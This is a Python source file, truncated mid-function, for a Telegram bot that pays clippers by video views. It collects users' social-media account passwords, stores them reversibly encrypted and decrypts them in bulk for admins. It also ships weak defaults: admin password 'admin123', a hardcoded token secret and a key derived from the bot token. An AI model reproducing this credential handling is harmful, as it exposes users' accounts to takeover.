import asyncio
import base64
import hashlib
import html
import json
import logging
import os
from contextlib import suppress
from datetime import date, datetime, timezone
from decimal import Decimal

import aiohttp
from aiohttp import web
from aiogram import BaseMiddleware, Bot, Dispatcher, F, types
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.exceptions import TelegramBadRequest
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup, TelegramObject
from cryptography.fernet import Fernet
from dotenv import load_dotenv

# Load variables from .env
load_dotenv()

# --- CONFIGURATION ---
TOKEN = os.getenv("BOT_TOKEN")
DATABASE_URL = os.getenv("DATABASE_URL")
ADMIN_IDS = [
    int(x.strip()) for x in os.getenv("ADMIN_IDS", "").split(",") if x.strip().isdigit()
]
DISCORD_WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL", "").strip()
ADMIN_PORTAL_PASSWORD = os.getenv("ADMIN_PORTAL_PASSWORD", "admin123")
ADMIN_TOKEN_SECRET = os.getenv("ADMIN_TOKEN_SECRET", "clipper_portal_secret_key_882")

bot_instance: Bot | None = None

def get_admin_token() -> str:
    return hashlib.sha256(f"{ADMIN_PORTAL_PASSWORD}:{ADMIN_TOKEN_SECRET}".encode()).hexdigest()

def json_serialize(obj):
    if isinstance(obj, Decimal):
        return float(obj)
    elif isinstance(obj, (datetime, date)):
        return obj.isoformat()
    raise TypeError(f"Type {type(obj)} not serializable")

logging.basicConfig(level=logging.INFO)

# --- ENCRYPTION HELPERS ---
def get_fernet() -> Fernet:
    key = os.getenv("ENCRYPTION_KEY")
    if not key:
        raw = hashlib.sha256((TOKEN or "fallback_encryption_secret_key").encode()).digest()
        key = base64.urlsafe_b64encode(raw).decode()
    return Fernet(key.encode())

def encrypt_password(plain: str) -> str:
    if not plain:
        return ""
    return get_fernet().encrypt(plain.encode()).decode()

def decrypt_password(cipher: str | None) -> str:
    if not cipher:
        return ""
    try:
        return get_fernet().decrypt(cipher.encode()).decode()
    except Exception:
        return cipher

# --- DISCORD FORWARDING HELPER ---
async def send_discord_notification(
    title: str,
    fields: list[dict],
    color: int = 0x5865F2,
    url: str | None = None,
):
    if not DISCORD_WEBHOOK_URL:
        return
    embed = {
        "title": title,
        "color": color,
        "fields": fields,
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }
    if url:
        embed["url"] = url
    payload = {"embeds": [embed]}
    try:
        async with aiohttp.ClientSession() as session:
            await session.post(DISCORD_WEBHOOK_URL, json=payload, timeout=5)
    except Exception as e:
        logging.warning(f"Could not forward to Discord webhook: {e}")

# --- DATABASE LAYER (Neon PostgreSQL with SQLite Fallback) ---
class Database:
    def __init__(self, dsn: str | None = None):
        self.dsn = dsn
        self.is_postgres = bool(dsn)
        self.pool = None
        self.db_path = "bot_database.db"

    async def connect(self):
        if self.is_postgres:
            import asyncpg
            dsn = self.dsn
            if dsn.startswith("postgres://"):
                dsn = dsn.replace("postgres://", "postgresql://", 1)
            self.pool = await asyncpg.create_pool(dsn, min_size=1, max_size=10)
            async with self.pool.acquire() as conn:
                await conn.execute("""
                    CREATE TABLE IF NOT EXISTS users (
                        id                SERIAL PRIMARY KEY,
                        chat_id           BIGINT UNIQUE NOT NULL,
                        telegram_username VARCHAR(64),
                        payment_details   TEXT,
                        created_at        TIMESTAMP NOT NULL DEFAULT NOW()
                    );

                    CREATE TABLE IF NOT EXISTS social_accounts (
                        id                 SERIAL PRIMARY KEY,
                        user_id            INT NOT NULL REFERENCES users(id) ON DELETE CASCADE,
                        platform           VARCHAR(20) NOT NULL
                                           CHECK (platform IN ('twitter','tiktok','youtube','instagram')),
                        handle             VARCHAR(100) NOT NULL,
                        password_encrypted TEXT,
                        created_at         TIMESTAMP NOT NULL DEFAULT NOW(),
                        UNIQUE (platform, handle),
                        UNIQUE (user_id, platform)
                    );

                    CREATE TABLE IF NOT EXISTS submissions (
                        id                SERIAL PRIMARY KEY,
                        user_id           INT NOT NULL REFERENCES users(id) ON DELETE CASCADE,
                        social_account_id INT NOT NULL REFERENCES social_accounts(id) ON DELETE CASCADE,
                        link              TEXT NOT NULL,
                        caption           TEXT,
                        views             INT NOT NULL DEFAULT 0,
                        payment_amount    NUMERIC(10,2) DEFAULT 0.0,
                        status            VARCHAR(20) NOT NULL DEFAULT 'pending'
                                          CHECK (status IN ('pending','under_review','approved','rejected')),
                        submitted_at      TIMESTAMP NOT NULL DEFAULT NOW()
                    );

                    CREATE INDEX IF NOT EXISTS idx_social_user      ON social_accounts(user_id);
                    CREATE INDEX IF NOT EXISTS idx_submissions_user ON submissions(user_id);
                    CREATE INDEX IF NOT EXISTS idx_submissions_acct ON submissions(social_account_id);
                    CREATE INDEX IF NOT EXISTS idx_submissions_stat ON submissions(status);
                """)
            logging.info(" Connected to Neon PostgreSQL database.")
        else:
            import aiosqlite
            async with aiosqlite.connect(self.db_path) as db:
                await db.execute("""
                    CREATE TABLE IF NOT EXISTS users (
                        id                INTEGER PRIMARY KEY AUTOINCREMENT,
                        chat_id           INTEGER UNIQUE NOT NULL,
                        telegram_username TEXT,
                        payment_details   TEXT,
                        created_at        TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                    );
                """)
                await db.execute("""
                    CREATE TABLE IF NOT EXISTS social_accounts (
                        id                 INTEGER PRIMARY KEY AUTOINCREMENT,
                        user_id            INTEGER NOT NULL REFERENCES users(id) ON DELETE CASCADE,
                        platform           TEXT NOT NULL CHECK (platform IN ('twitter','tiktok','youtube','instagram')),
                        handle             TEXT NOT NULL,
                        password_encrypted TEXT,
                        created_at         TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                        UNIQUE (platform, handle),
                        UNIQUE (user_id, platform)
                    );
                """)
                await db.execute("""
                    CREATE TABLE IF NOT EXISTS submissions (
                        id                INTEGER PRIMARY KEY AUTOINCREMENT,
                        user_id           INTEGER NOT NULL REFERENCES users(id) ON DELETE CASCADE,
                        social_account_id INTEGER NOT NULL REFERENCES social_accounts(id) ON DELETE CASCADE,
                        link              TEXT NOT NULL,
                        caption           TEXT,
                        views             INTEGER DEFAULT 0,
                        payment_amount    REAL DEFAULT 0.0,
                        status            TEXT DEFAULT 'pending' CHECK (status IN ('pending','under_review','approved','rejected')),
                        submitted_at      TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                    );
                """)
                await db.execute("CREATE INDEX IF NOT EXISTS idx_social_user ON social_accounts(user_id);")
                await db.execute("CREATE INDEX IF NOT EXISTS idx_submissions_user ON submissions(user_id);")
                await db.execute("CREATE INDEX IF NOT EXISTS idx_submissions_acct ON submissions(social_account_id);")
                await db.execute("CREATE INDEX IF NOT EXISTS idx_submissions_stat ON submissions(status);")
                await db.commit()
            logging.info(" Connected to local SQLite database (bot_database.db).")

    async def close(self):
        if self.is_postgres and self.pool:
            await self.pool.close()

    async def get_user(self, chat_id: int):
        if self.is_postgres:
            async with self.pool.acquire() as conn:
                row = await conn.fetchrow(
                    """
                    SELECT 
                        u.id,
                        u.chat_id,
                        u.telegram_username,
                        u.payment_details,
                        u.payment_details AS payment_info,
                        COALESCE(SUM(s.views), 0)::INTEGER AS views,
                        COALESCE(SUM(s.payment_amount), 0.0)::FLOAT AS money
                    FROM users u
                    LEFT JOIN submissions s ON s.user_id = u.id AND s.status = 'approved'
                    WHERE u.chat_id = $1
                    GROUP BY u.id, u.chat_id, u.telegram_username, u.payment_details
                    """,
                    chat_id,
                )
                return dict(row) if row else None
        else:
            import aiosqlite
            async with aiosqlite.connect(self.db_path) as db:
                async with db.execute(
                    """
                    SELECT 
                        u.id,
                        u.chat_id,
                        u.telegram_username,
                        u.payment_details,
                        COALESCE(SUM(s.views), 0) AS views,
                        COALESCE(SUM(s.payment_amount), 0.0) AS money
                    FROM users u
                    LEFT JOIN submissions s ON s.user_id = u.id AND s.status = 'approved'
                    WHERE u.chat_id = ?
                    GROUP BY u.id, u.chat_id, u.telegram_username, u.payment_details
                    """,
                    (chat_id,),
                ) as cursor:
                    row = await cursor.fetchone()
                    if row:
                        return {
                            "id": row[0],
                            "chat_id": row[1],
                            "telegram_username": row[2],
                            "payment_details": row[3],
                            "payment_info": row[3],
                            "views": row[4],
                            "money": row[5],
                        }
                    return None

    async def update_payment_info(self, chat_id: int, payment_details: str):
        if self.is_postgres:
            async with self.pool.acquire() as conn:
                await conn.execute(
                    "UPDATE users SET payment_details = $1 WHERE chat_id = $2",
                    payment_details,
                    chat_id,
                )
        else:
            import aiosqlite
            async with aiosqlite.connect(self.db_path) as db:
                await db.execute(
                    "UPDATE users SET payment_details = ? WHERE chat_id = ?",
                    (payment_details, chat_id),
                )
                await db.commit()

    async def get_user_by_username(self, username: str):
        clean_user = username.strip()
        if not clean_user.startswith("@"):
            clean_user = f"@{clean_user}"

        if self.is_postgres:
            async with self.pool.acquire() as conn:
                row = await conn.fetchrow(
                    """
                    SELECT 
                        u.id,
                        u.chat_id,
                        u.telegram_username,
                        u.payment_details,
                        u.payment_details AS payment_info,
                        COALESCE(SUM(s.views), 0)::INTEGER AS views,
                        COALESCE(SUM(s.payment_amount), 0.0)::FLOAT AS money
                    FROM users u
                    LEFT JOIN submissions s ON s.user_id = u.id AND s.status = 'approved'
                    WHERE LOWER(u.telegram_username) = LOWER($1)
                    GROUP BY u.id, u.chat_id, u.telegram_username, u.payment_details
                    """,
                    clean_user,
                )
                return dict(row) if row else None
        else:
            import aiosqlite
            async with aiosqlite.connect(self.db_path) as db:
                async with db.execute(
                    """
                    SELECT 
                        u.id,
                        u.chat_id,
                        u.telegram_username,
                        u.payment_details,
                        COALESCE(SUM(s.views), 0) AS views,
                        COALESCE(SUM(s.payment_amount), 0.0) AS money
                    FROM users u
                    LEFT JOIN submissions s ON s.user_id = u.id AND s.status = 'approved'
                    WHERE LOWER(u.telegram_username) = LOWER(?)
                    GROUP BY u.id, u.chat_id, u.telegram_username, u.payment_details
                    """,
                    (clean_user,),
                ) as cursor:
                    row = await cursor.fetchone()
                    if row:
                        return {
                            "id": row[0],
                            "chat_id": row[1],
                            "telegram_username": row[2],
                            "payment_details": row[3],
                            "payment_info": row[3],
                            "views": row[4],
                            "money": row[5],
                        }
                    return None

    async def get_user_social_accounts_full(self, chat_id: int) -> list[dict]:
        if self.is_postgres:
            async with self.pool.acquire() as conn:
                rows = await conn.fetch(
                    """
                    SELECT sa.id, sa.platform, sa.handle, sa.password_encrypted
                    FROM social_accounts sa
                    JOIN users u ON sa.user_id = u.id
                    WHERE u.chat_id = $1
                    ORDER BY sa.id ASC
                    """,
                    chat_id,
                )
                res = []
                for r in rows:
                    res.append({
                        "id": r["id"],
                        "platform": r["platform"],
                        "handle": r["handle"],
                        "password": decrypt_password(r["password_encrypted"]),
                        "password_encrypted": r["password_encrypted"],
                    })
                return res
        else:
            import aiosqlite
            async with aiosqlite.connect(self.db_path) as db:
                async with db.execute(
                    """
                    SELECT sa.id, sa.platform, sa.handle, sa.password_encrypted
                    FROM social_accounts sa
                    JOIN users u ON sa.user_id = u.id
                    WHERE u.chat_id = ?
                    ORDER BY sa.id ASC
                    """,
                    (chat_id,),
                ) as cursor:
                    rows = await cursor.fetchall()
                    res = []
                    for r in rows:
                        res.append({
                            "id": r[0],
                            "platform": r[1],
                            "handle": r[2],
                            "password": decrypt_password(r[3]),
                            "password_encrypted": r[3],
                        })
                    return res

    async def upsert_user(self, chat_id: int, telegram_username: str) -> int:
        if self.is_postgres:
            async with self.pool.acquire() as conn:
                row = await conn.fetchrow(
                    """
                    INSERT INTO users (chat_id, telegram_username)
                    VALUES ($1, $2)
                    ON CONFLICT (chat_id) DO UPDATE SET
                        telegram_username = COALESCE(users.telegram_username, EXCLUDED.telegram_username)
                    RETURNING id
                    """,
                    chat_id,
                    telegram_username,
                )
                return row["id"]
        else:
            import aiosqlite
            async with aiosqlite.connect(self.db_path) as db:
                await db.execute(
                    """
                    INSERT INTO users (chat_id, telegram_username)
                    VALUES (?, ?)
                    ON CONFLICT (chat_id) DO UPDATE SET
                        telegram_username = COALESCE(users.telegram_username, excluded.telegram_username)
                    """,
                    (chat_id, telegram_username),
                )
                await db.commit()
                async with db.execute("SELECT id FROM users WHERE chat_id = ?", (chat_id,)) as cur:
                    r = await cur.fetchone()
                    return r[0]

    async def update_user_stats(self, target_username: str, views: int, money: float) -> bool:
        user = await self.get_user_by_username(target_username)
        if not user:
            return False
        user_id = user["id"]

        if self.is_postgres:
            async with self.pool.acquire() as conn:
                sub = await conn.fetchrow(
                    "SELECT id FROM submissions WHERE user_id = $1 ORDER BY id DESC LIMIT 1",
                    user_id,
                )
                if sub:
                    await conn.execute(
                        "UPDATE submissions SET views = $1, payment_amount = $2, status = 'approved' WHERE id = $3",
                        views, money, sub["id"],
                    )
                    return True
                else:
                    sa = await conn.fetchrow(
                        "SELECT id FROM social_accounts WHERE user_id = $1 LIMIT 1", user_id
                    )
                    sa_id = sa["id"] if sa else None
                    if not sa_id:
                        sa_id = await conn.fetchval(
                            "INSERT INTO social_accounts (user_id, platform, handle, password_encrypted) VALUES ($1, 'tiktok', $2, '') RETURNING id",
                            user_id, target_username,
                        )
                    await conn.execute(
                        """
                        INSERT INTO submissions (user_id, social_account_id, link, caption, views, payment_amount, status)
                        VALUES ($1, $2, 'https://t.me/' || SUBSTRING($3 FROM 2), 'Admin manual stats', $4, $5, 'approved')
                        """,
                        user_id, sa_id, target_username, views, money,
                    )
                    return True
        else:
            import aiosqlite
            async with aiosqlite.connect(self.db_path) as db:
                async with db.execute(
                    "SELECT id FROM submissions WHERE user_id = ? ORDER BY id DESC LIMIT 1",
                    (user_id,),
                ) as cur:
                    sub = await cur.fetchone()
                if sub:
                    await db.execute(
                        "UPDATE submissions SET views = ?, payment_amount = ?, status = 'approved' WHERE id = ?",
                        (views, money, sub[0]),
                    )
                    await db.commit()
                    return True
                else:
                    async with db.execute(
                        "SELECT id FROM social_accounts WHERE user_id = ? LIMIT 1", (user_id,)
                    ) as cur:
                        sa = await cur.fetchone()
                    if sa:
                        sa_id = sa[0]
                    else:
                        cursor = await db.execute(
                            "INSERT INTO social_accounts (user_id, platform, handle, password_encrypted) VALUES (?, 'tiktok', ?, '')",
                            (user_id, target_username),
                        )
                        sa_id = cursor.lastrowid
                    await db.execute(
                        """
                        INSERT INTO submissions (user_id, social_account_id, link, caption, views, payment_amount, status)
                        VALUES (?, ?, 'https://t.me', 'Admin manual stats', ?, ?, 'approved')
                        """,
                        (user_id, sa_id, views, money),
                    )
                    await db.commit()
                    return True

    async def add_social_account(
        self, chat_id: int, telegram_username: str, platform: str, handle: str, password: str
    ):
        norm_platform = platform.strip().lower()
        encrypted_pass = encrypt_password(password)

        if self.is_postgres:
            async with self.pool.acquire() as conn:
                user_row = await conn.fetchrow("SELECT id FROM users WHERE chat_id = $1", chat_id)
                if not user_row:
                    user_id = await self.upsert_user(chat_id, telegram_username)
                else:
                    user_id = user_row["id"]

                await conn.execute(
                    "DELETE FROM social_accounts WHERE user_id = $1 AND platform = $2",
                    user_id,
                    norm_platform,
                )
                await conn.execute(
                    "DELETE FROM social_accounts WHERE platform = $1 AND handle = $2",
                    norm_platform,
                    handle,
                )
                await conn.execute(
                    """
                    INSERT INTO social_accounts (user_id, platform, handle, password_encrypted)
                    VALUES ($1, $2, $3, $4)
                    """,
                    user_id,
                    norm_platform,
                    handle,
                    encrypted_pass,
                )
        else:
            import aiosqlite
            async with aiosqlite.connect(self.db_path) as db:
                async with db.execute("SELECT id FROM users WHERE chat_id = ?", (chat_id,)) as cur:
                    user_row = await cur.fetchone()
                if not user_row:
                    user_id = await self.upsert_user(chat_id, telegram_username)
                else:
                    user_id = user_row[0]

                await db.execute(
                    "DELETE FROM social_accounts WHERE user_id = ? AND platform = ?",
                    (user_id, norm_platform),
                )
                await db.execute(
                    "DELETE FROM social_accounts WHERE platform = ? AND handle = ?",
                    (norm_platform, handle),
                )
                await db.execute(
                    """
                    INSERT INTO social_accounts (user_id, platform, handle, password_encrypted)
                    VALUES (?, ?, ?, ?)
                    """,
                    (user_id, norm_platform, handle, encrypted_pass),
                )
                await db.commit()

    async def add_submission(
        self,
        chat_id: int,
        telegram_username: str,
        link: str,
        social_account_id: int,
        caption: str | None = None,
    ) -> int:
        if self.is_postgres:
            async with self.pool.acquire() as conn:
                user_row = await conn.fetchrow("SELECT id FROM users WHERE chat_id = $1", chat_id)
                if not user_row:
                    user_id = await self.upsert_user(chat_id, telegram_username)
                else:
                    user_id = user_row["id"]

                row = await conn.fetchrow(
                    """
                    INSERT INTO submissions (user_id, social_account_id, link, caption, views, payment_amount, status)
                    VALUES ($1, $2, $3, $4, 0, 0.0, 'pending')
                    RETURNING id
                    """,
                    user_id,
                    social_account_id,
                    link,
                    caption,
                )
                return row["id"]
        else:
            import aiosqlite
            async with aiosqlite.connect(self.db_path) as db:
                async with db.execute("SELECT id FROM users WHERE chat_id = ?", (chat_id,)) as cur:
                    user_row = await cur.fetchone()
                if not user_row:
                    user_id = await self.upsert_user(chat_id, telegram_username)
                else:
                    user_id = user_row[0]

                cursor = await db.execute(
                    """
                    INSERT INTO submissions (user_id, social_account_id, link, caption, views, payment_amount, status)
                    VALUES (?, ?, ?, ?, 0, 0.0, 'pending')
                    """,
                    (user_id, social_account_id, link, caption),
                )
                await db.commit()
                return cursor.lastrowid

    async def get_user_submissions(self, chat_id: int) -> list[dict]:
        if self.is_postgres:
            async with self.pool.acquire() as conn:
                rows = await conn.fetch(
                    """
                    SELECT 
                        s.id,
                        s.link,
                        COALESCE(s.payment_amount, 0.0)::FLOAT AS payment,
                        s.views,
                        s.status,
                        s.submitted_at AS created_at,
                        s.caption,
                        sa.platform,
                        sa.handle
                    FROM submissions s
                    JOIN users u ON s.user_id = u.id
                    JOIN social_accounts sa ON s.social_account_id = sa.id
                    WHERE u.chat_id = $1
                    ORDER BY s.id DESC
                    """,
                    chat_id,
                )
                return [dict(r) for r in rows]
        else:
            import aiosqlite
            async with aiosqlite.connect(self.db_path) as db:
                async with db.execute(
                    """
                    SELECT 
                        s.id,
                        s.link,
                        COALESCE(s.payment_amount, 0.0) AS payment,
                        s.views,
                        s.status,
                        s.submitted_at AS created_at,
                        s.caption,
                        sa.platform,
                        sa.handle
                    FROM submissions s
                    JOIN users u ON s.user_id = u.id
                    JOIN social_accounts sa ON s.social_account_id = sa.id
                    WHERE u.chat_id = ?
                    ORDER BY s.id DESC
                    """,
                    (chat_id,),
                ) as cursor:
                    rows = await cursor.fetchall()
                    return [
                        {
                            "id": r[0],
                            "link": r[1],
                            "payment": r[2],
                            "views": r[3],
                            "status": r[4],
                            "created_at": r[5],
                            "caption": r[6],
                            "platform": r[7],
                            "handle": r[8],
                        }
                        for r in rows
                    ]

    async def update_submission_payment(
        self, submission_id: int, payment: float, views: int | None = None
    ) -> dict | None:
        if self.is_postgres:
            async with self.pool.acquire() as conn:
                if views is not None:
                    row = await conn.fetchrow(
                        """
                        UPDATE submissions
                        SET payment_amount = $1, views = $2, status = 'approved'
                        WHERE id = $3
                        RETURNING (SELECT chat_id FROM users WHERE id = submissions.user_id) AS chat_id,
                                  (SELECT telegram_username FROM users WHERE id = submissions.user_id) AS telegram_username,
                                  link, caption, views, payment_amount
                        """,
                        payment,
                        views,
                        submission_id,
                    )
                else:
                    row = await conn.fetchrow(
                        """
                        UPDATE submissions
                        SET payment_amount = $1, status = 'approved'
                        WHERE id = $2
                        RETURNING (SELECT chat_id FROM users WHERE id = submissions.user_id) AS chat_id,
                                  (SELECT telegram_username FROM users WHERE id = submissions.user_id) AS telegram_username,
                                  link, caption, views, payment_amount
                        """,
                        payment,
                        submission_id,
                    )
                return dict(row) if row else None
        else:
            import aiosqlite
            async with aiosqlite.connect(self.db_path) as db:
                if views is not None:
                    await db.execute(
                        "UPDATE submissions SET payment_amount = ?, views = ?, status = 'approved' WHERE id = ?",
                        (payment, views, submission_id),
                    )
                else:
                    await db.execute(
                        "UPDATE submissions SET payment_amount = ?, status = 'approved' WHERE id = ?",
                        (payment, submission_id),
                    )
                await db.commit()
                async with db.execute(
                    """
                    SELECT u.chat_id, u.telegram_username, s.link, s.caption, s.views, s.payment_amount
                    FROM submissions s
                    JOIN users u ON s.user_id = u.id
                    WHERE s.id = ?
                    """,
                    (submission_id,),
                ) as cur:
                    row = await cur.fetchone()
                    if not row:
                        return None
                    return {
                        "chat_id": row[0],
                        "telegram_username": row[1],
                        "link": row[2],
                        "caption": row[3],
                        "views": row[4],
                        "payment_amount": row[5],
                    }

    async def update_submission_views(self, submission_id: int, views: int) -> dict | None:
        if self.is_postgres:
            async with self.pool.acquire() as conn:
                row = await conn.fetchrow(
                    """
                    UPDATE submissions
                    SET views = $1
                    WHERE id = $2
                    RETURNING (SELECT chat_id FROM users WHERE id = submissions.user_id) AS chat_id,
                              (SELECT telegram_username FROM users WHERE id = submissions.user_id) AS telegram_username,
                              link, caption, views, payment_amount
                    """,
                    views,
                    submission_id,
                )
                return dict(row) if row else None
        else:
            import aiosqlite
            async with aiosqlite.connect(self.db_path) as db:
                await db.execute(
                    "UPDATE submissions SET views = ? WHERE id = ?",
                    (views, submission_id),
                )
                await db.commit()
                async with db.execute(
                    """
                    SELECT u.chat_id, u.telegram_username, s.link, s.caption, s.views, s.payment_amount
                    FROM submissions s
                    JOIN users u ON s.user_id = u.id
                    WHERE s.id = ?
                    """,
                    (submission_id,),
                ) as cur:
                    row = await cur.fetchone()
                    if not row:
                        return None
                    return {
                        "chat_id": row[0],
                        "telegram_username": row[1],
                        "link": row[2],
                        "caption": row[3],
                        "views": row[4],
                        "payment_amount": row[5],
                    }

    async def get_leaderboard(self, limit: int = 5) -> list[dict]:
        if self.is_postgres:
            async with self.pool.acquire() as conn:
                rows = await conn.fetch(
                    """
                    SELECT 
                        u.telegram_username,
                        COALESCE(SUM(s.views), 0)::INTEGER AS views,
                        COALESCE(SUM(s.payment_amount), 0.0)::FLOAT AS money
                    FROM users u
                    JOIN submissions s ON s.user_id = u.id AND s.status = 'approved'
                    GROUP BY u.id, u.telegram_username
                    ORDER BY views DESC, money DESC
                    LIMIT $1
                    """,
                    limit,
                )
                return [dict(r) for r in rows]
        else:
            import aiosqlite
            async with aiosqlite.connect(self.db_path) as db:
                async with db.execute(
                    """
                    SELECT 
                        u.telegram_username,
                        COALESCE(SUM(s.views), 0) AS views,
                        COALESCE(SUM(s.payment_amount), 0.0) AS money
                    FROM users u
                    JOIN submissions s ON s.user_id = u.id AND s.status = 'approved'
                    GROUP BY u.id, u.telegram_username
                    ORDER BY views DESC, money DESC
                    LIMIT ?
                    """,
                    (limit,),
                ) as cursor:
                    rows = await cursor.fetchall()
                    return [
                        {"telegram_username": r[0], "views": r[1], "money": r[2]}
                        for r in rows
                    ]

    async def get_admin_stats(self) -> dict:
        if self.is_postgres:
            async with self.pool.acquire() as conn:
                row = await conn.fetchrow("""
                    SELECT
                        (SELECT COUNT(*) FROM users) AS total_users,
                        (SELECT COUNT(*) FROM submissions) AS total_submissions,
                        (SELECT COUNT(*) FROM submissions WHERE status = 'pending') AS pending_submissions,
                        (SELECT COUNT(*) FROM submissions WHERE status = 'under_review') AS under_review_submissions,
                        (SELECT COUNT(*) FROM submissions WHERE status = 'approved') AS approved_submissions,
                        (SELECT COUNT(*) FROM submissions WHERE status = 'rejected') AS rejected_submissions,
                        (SELECT COALESCE(SUM(views), 0)::BIGINT FROM submissions WHERE status = 'approved') AS total_views,
                        (SELECT COALESCE(SUM(payment_amount), 0.0)::FLOAT FROM submissions WHERE status = 'approved') AS total_payments,
                        (SELECT COUNT(*) FROM social_accounts) AS total_social_accounts
                """)
                return dict(row) if row else {}
        else:
            import aiosqlite
            async with aiosqlite.connect(self.db_path) as db:
                async with db.execute("""
                    SELECT
                        (SELECT COUNT(*) FROM users) AS total_users,
                        (SELECT COUNT(*) FROM submissions) AS total_submissions,
                        (SELECT COUNT(*) FROM submissions WHERE status = 'pending') AS pending_submissions,
                        (SELECT COUNT(*) FROM submissions WHERE status = 'under_review') AS under_review_submissions,
                        (SELECT COUNT(*) FROM submissions WHERE status = 'approved') AS approved_submissions,
                        (SELECT COUNT(*) FROM submissions WHERE status = 'rejected') AS rejected_submissions,
                        (SELECT COALESCE(SUM(views), 0) FROM submissions WHERE status = 'approved') AS total_views,
                        (SELECT COALESCE(SUM(payment_amount), 0.0) FROM submissions WHERE status = 'approved') AS total_payments,
                        (SELECT COUNT(*) FROM social_accounts) AS total_social_accounts
                """) as cur:
                    row = await cur.fetchone()
                    if row:
                        return {
                            "total_users": row[0],
                            "total_submissions": row[1],
                            "pending_submissions": row[2],
                            "under_review_submissions": row[3],
                            "approved_submissions": row[4],
                            "rejected_submissions": row[5],
                            "total_views": row[6],
                            "total_payments": row[7],
                            "total_social_accounts": row[8],
                        }
                    return {}

    async def get_admin_users(self) -> list[dict]:
        if self.is_postgres:
            async with self.pool.acquire() as conn:
                user_rows = await conn.fetch("""
                    SELECT 
                        u.id,
                        u.chat_id,
                        u.telegram_username,
                        u.payment_details,
                        u.created_at,
                        COALESCE(SUM(s.views), 0)::INTEGER AS views,
                        COALESCE(SUM(s.payment_amount), 0.0)::FLOAT AS money,
                        (SELECT COUNT(*) FROM submissions sub WHERE sub.user_id = u.id) AS submission_count
                    FROM users u
                    LEFT JOIN submissions s ON s.user_id = u.id AND s.status = 'approved'
                    GROUP BY u.id, u.chat_id, u.telegram_username, u.payment_details, u.created_at
                    ORDER BY u.id DESC
                """)
                social_rows = await conn.fetch("""
                    SELECT id, user_id, platform, handle, password_encrypted, created_at
                    FROM social_accounts
                    ORDER BY id ASC
                """)
                user_list = [dict(r) for r in user_rows]
                social_list = [dict(r) for r in social_rows]
        else:
            import aiosqlite
            async with aiosqlite.connect(self.db_path) as db:
                async with db.execute("""
                    SELECT 
                        u.id,
                        u.chat_id,
                        u.telegram_username,
                        u.payment_details,
                        u.created_at,
                        COALESCE(SUM(s.views), 0) AS views,
                        COALESCE(SUM(s.payment_amount), 0.0) AS money,
                        (SELECT COUNT(*) FROM submissions sub WHERE sub.user_id = u.id) AS submission_count
                    FROM users u
                    LEFT JOIN submissions s ON s.user_id = u.id AND s.status = 'approved'
                    GROUP BY u.id, u.chat_id, u.telegram_username, u.payment_details, u.created_at
                    ORDER BY u.id DESC
                """) as cur:
                    u_tuples = await cur.fetchall()
                    user_list = [
                        {
                            "id": r[0], "chat_id": r[1], "telegram_username": r[2],
                            "payment_details": r[3], "created_at": r[4], "views": r[5],
                            "money": r[6], "submission_count": r[7]
                        }
                        for r in u_tuples
                    ]
                async with db.execute("SELECT id, user_id, platform, handle, password_encrypted, created_at FROM social_accounts ORDER BY id ASC") as cur:
                    s_tuples = await cur.fetchall()
                    social_list = [
                        {"id": r[0], "user_id": r[1], "platform": r[2], "handle": r[3], "password_encrypted": r[4], "created_at": r[5]}
                        for r in s_tuples
                    ]

        socials_by_user = {}
        for s in social_list:
            uid = s["user_id"]
            if uid not in socials_by_user:
                socials_by_user[uid] = []
            decrypted_pass = decrypt_password(s.get("password_encrypted"))
            socials_by_user[uid].append({
                "id": s["id"],
                "platform": s["platform"],
                "handle": s["handle"],
                "password": decrypted_pass,
                "password_encrypted": s.get("password_encrypted"),
                "created_at": s.get("created_at"),
            })

        res = []
        for u in user_list:
            u["social_accounts"] = socials_by_user.get(u["id"], [])
            res.append(u)
        return res

    async def get_admin_submissions(self) -> list[dict]:
        if self.is_postgres:
            async with self.pool.acquire() as conn:
                rows = await conn.fetch("""
                    SELECT 
                        s.id,
                        s.user_id,
                        u.chat_id,
                        u.telegram_username,
                        u.payment_details,
                        s.social_account_id,
                        sa.platform,
                        sa.handle,
                        s.link,
                        s.caption,
                        s.views,
                        COALESCE(s.payment_amount, 0.0)::FLOAT AS payment_amount,
                        s.status,
                        s.submitted_at
                    FROM submissions s
                    JOIN users u ON s.user_id = u.id
                    JOIN social_accounts sa ON s.social_account_id = sa.id
                    ORDER BY s.id DESC
                """)
                return [dict(r) for r in rows]
        else:
            import aiosqlite
            async with aiosqlite.connect(self.db_path) as db:
                async with db.execute("""
                    SELECT 
                        s.id,
                        s.user_id,
                        u.chat_id,
                        u.telegram_username,
                        u.payment_details,
                        s.social_account_id,
                        sa.platform,
                        sa.handle,
                        s.link,
                        s.caption,
                        s.views,
                        COALESCE(s.payment_amount, 0.0) AS payment_amount,
                        s.status,
                        s.submitted_at
                    FROM submissions s
                    JOIN users u ON s.user_id = u.id
                    JOIN social_accounts sa ON s.social_account_id = sa.id
                    ORDER BY s.id DESC
                """) as cur:
                    rows = await cur.fetchall()
                    return [
                        {
                            "id": r[0], "user_id": r[1], "chat_id": r[2],
                            "telegram_username": r[3], "payment_details": r[4],
                            "social_account_id": r[5], "platform": r[6], "handle": r[7],
                            "link": r[8], "caption": r[9], "views": r[10],
                            "payment_amount": r[11], "status": r[12], "submitted_at": r[13]
                        }
                        for r in rows
                    ]

    async def admin_update_submission(
        self,
        submission_id: int,
        views: int | None = None,
        payment_amount: float | None = None,
        status: str | None = None,
    ) -> dict | None:
        if self.is_postgres:
            async with self.pool.acquire() as conn:
                row = await conn.fetchrow("""
                    UPDATE submissions
                    SET 
                        views = COALESCE($1, views),
                        payment_amount = COALESCE($2, payment_amount),
                        status = COALESCE($3, status)
                    WHERE id = $4
                    RETURNING 
                        id, user_id, link, caption, views, payment_amount, status, submitted_at,
                        (SELECT chat_id FROM users WHERE id = submissions.user_id) AS chat_id,
                        (SELECT telegram_username FROM users WHERE id = submissions.user_id) AS telegram_username
                """, views, payment_amount, status, submission_id)
                return dict(row) if row else None
        else:
            import aiosqlite
            async with aiosqlite.connect(self.db_path) as db:
                updates = []
                params = []
                if views is not None:
                    updates.append("views = ?")
                    params.append(views)
                if payment_amount is not None:
